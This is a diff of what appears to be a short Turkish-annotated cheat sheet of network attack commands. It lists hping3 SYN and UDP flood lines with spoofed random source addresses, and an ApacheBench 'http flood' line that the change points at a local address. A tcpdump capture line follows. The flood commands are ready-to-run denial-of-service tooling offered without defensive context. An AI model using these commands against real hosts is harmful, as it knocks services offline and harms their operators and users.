@@ -4,7 +4,7 @@ hping3 -i u1 -S -p 80 -c 10  192.168.1.1
 hping3 -c 20000 -d 120 -S -w 64 -p TARGET_PORT --flood --rand-source TARGET_SITE
 hping3 --flood --rand-source --udp -p TARGET_PORT TARGET_IP //udp pakeki 
 -------------------------------------------------------------------------------------------
-http flood : ab -n 10 -c 5 <hedef>
+http flood : ab -n 10 -c 5 http://192.168.1.1/
 
 ------------------------------------------------------------------------------------------
 tcpdump -i eth0 src host <ip adresleri>
